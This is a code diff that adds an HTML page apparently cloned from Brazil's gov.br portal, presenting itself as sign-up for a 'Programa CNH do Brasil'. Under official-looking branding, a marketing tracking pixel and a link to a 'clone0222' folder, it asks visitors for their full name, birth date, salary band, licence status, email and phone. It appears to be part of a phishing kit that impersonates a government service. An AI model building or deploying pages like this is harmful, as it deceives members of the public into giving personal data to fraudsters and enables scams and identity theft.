@@ -1,0 +1,167 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <script src="js/latest.js" async="" defer=""></script>
+    <script>
+      window.pixelId = "6983ef4f560f5bf5f424682e";
+      var a = document.createElement("script");
+      a.setAttribute("async", "");
+      a.setAttribute("defer", "");
+      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+      document.head.appendChild(a);
+    </script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirme seus dados - CNH do Brasil | gov.br</title>
+    <link rel="stylesheet" href="css/shared.css">
+    <link rel="stylesheet" href="css/verificar.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/all.min.css">
+</head>
+<body>
+    <header class="verify-header">
+        <div class="header-row-top">
+            <div class="header-left">
+                <a href="../clone0222/index.html" class="logo-gov">
+                    <img src="images/imgi_6_image.jpg" alt="gov.br">
+                </a>
+                <button class="btn-header-icon" aria-label="Menu">
+                    <i class="fas fa-ellipsis-v"></i>
+                </button>
+            </div>
+            <div class="header-right">
+                <button class="btn-header-icon" aria-label="Notificações">
+                    <i class="fas fa-bell"></i>
+                </button>
+                <button class="btn-header-icon" aria-label="Aplicativos">
+                    <i class="fas fa-th"></i>
+                </button>
+                <button class="btn-user">
+                    <i class="fas fa-user"></i>
+                    <span class="user-name">Usuário</span>
+                </button>
+                <button class="btn-header-icon btn-search" aria-label="Pesquisar">
+                    <i class="fas fa-search"></i>
+                </button>
+            </div>
+        </div>
+        <div class="header-nav">
+            <button class="btn-hamburger" aria-label="Menu">
+                <span></span><span></span><span></span>
+            </button>
+            <span class="nav-title">Programa CNH do Brasil</span>
+            <button class="btn-header-icon btn-search-nav" aria-label="Pesquisar">
+                <i class="fas fa-search"></i>
+            </button>
+        </div>
+    </header>
+
+    <main class="verify-main">
+        <div class="verify-card">
+            <h1 class="verify-title">Confirme seus dados para o cadastro no Programa CNH do Brasil</h1>
+
+            <div class="verify-step active" data-step="1" data-quiz="nome">
+                <div class="step-question">
+                    <span class="step-number">1</span>
+                    <span class="step-text">Qual é seu nome completo?</span>
+                </div>
+                <p class="quiz-error" id="quiz-error" aria-live="polite"></p>
+                <div class="step-options" id="step-options-1"></div>
+            </div>
+
+            <div class="verify-step" data-step="2" data-quiz="nascimento">
+                <div class="step-question">
+                    <span class="step-number">2</span>
+                    <span class="step-text">Qual é sua data de nascimento?</span>
+                </div>
+                <p class="quiz-error" id="quiz-error-2" aria-live="polite"></p>
+                <div class="step-options" id="step-options-2"></div>
+            </div>
+
+            <div class="verify-step" data-step="3">
+                <div class="step-question">
+                    <span class="step-number">3</span>
+                    <span class="step-text">Qual é sua faixa salarial atual?</span>
+                </div>
+                <div class="step-options">
+                    <label class="option-item">
+                        <input type="radio" name="salario" value="Desempregado(a)">
+                        <span class="option-text">Desempregado(a)</span>
+                    </label>
+                    <label class="option-item">
+                        <input type="radio" name="salario" value="Até R$ 2.640 (até 2 Salários Mínimos)">
+                        <span class="option-text">Até R$ 2.640 (até 2 Salários Mínimos)</span>
+                    </label>
+                    <label class="option-item">
+                        <input type="radio" name="salario" value="De R$ 2.641 A R$ 6.600 (2 A 5 Salários Mínimos)">
+                        <span class="option-text">De R$ 2.641 A R$ 6.600 (2 A 5 Salários Mínimos)</span>
+                    </label>
+                    <label class="option-item">
+                        <input type="radio" name="salario" value="De R$ 6.601 A R$ 13.200 (5 A 10 Salários Mínimos)">
+                        <span class="option-text">De R$ 6.601 A R$ 13.200 (5 A 10 Salários Mínimos)</span>
+                    </label>
+                    <label class="option-item">
+                        <input type="radio" name="salario" value="Acima De R$ 13.200 (mais De 10 Salários Mínimos)">
+                        <span class="option-text">Acima De R$ 13.200 (mais De 10 Salários Mínimos)</span>
+                    </label>
+                </div>
+            </div>
+
+            <div class="verify-step" data-step="4">
+                <div class="step-question">
+                    <span class="step-number">4</span>
+                    <span class="step-text">Qual sua situação atual de habilitação?</span>
+                </div>
+                <div class="step-options">
+                    <label class="option-item">
+                        <input type="radio" name="habilitacao" value="Não Possuo Cnh">
+                        <span class="option-text">Não Possuo Cnh</span>
+                    </label>
+                    <label class="option-item">
+                        <input type="radio" name="habilitacao" value="Possuo Cnh Categoria A (moto)">
+                        <span class="option-text">Possuo Cnh Categoria A (moto)</span>
+                    </label>
+                    <label class="option-item">
+                        <input type="radio" name="habilitacao" value="Possuo Cnh Categoria B (carro)">
+                        <span class="option-text">Possuo Cnh Categoria B (carro)</span>
+                    </label>
+                    <label class="option-item">
+                        <input type="radio" name="habilitacao" value="Possuo Cnh Categoria Ab Ou Superior">
+                        <span class="option-text">Possuo Cnh Categoria Ab Ou Superior</span>
+                    </label>
+                </div>
+            </div>
+
+            <div class="verify-step" data-step="5">
+                <div class="step-question">
+                    <span class="step-number">5</span>
+                    <span class="step-text">Qual é o seu email?</span>
+                </div>
+                <div class="step-input">
+                    <input type="email" id="email-input" class="email-input" placeholder="Digite seu email (ex: nome@gmail.com)" autocomplete="email">
+                    <span class="input-error" id="email-error"></span>
+                </div>
+            </div>
+
+            <div class="verify-step" data-step="6">
+                <div class="step-question">
+                    <span class="step-number">6</span>
+                    <span class="step-text">Qual é o seu telefone?</span>
+                </div>
+                <div class="step-input">
+                    <input type="tel" id="telefone-input" class="email-input" placeholder="(11) 99999-9999" autocomplete="tel" maxlength="15">
+                    <span class="input-error" id="telefone-error"></span>
+                </div>
+            </div>
+
+            <div class="verify-actions">
+                <button type="button" class="btn-confirmar" id="btn-confirmar">
+                    <span class="btn-confirmar-content">Confirmar</span>
+                </button>
+            </div>
+        </div>
+    </main>
+
+    <script src="js/shared.js"></script>
+    <script src="js/verificar.js"></script>
+
+
+</body></html>
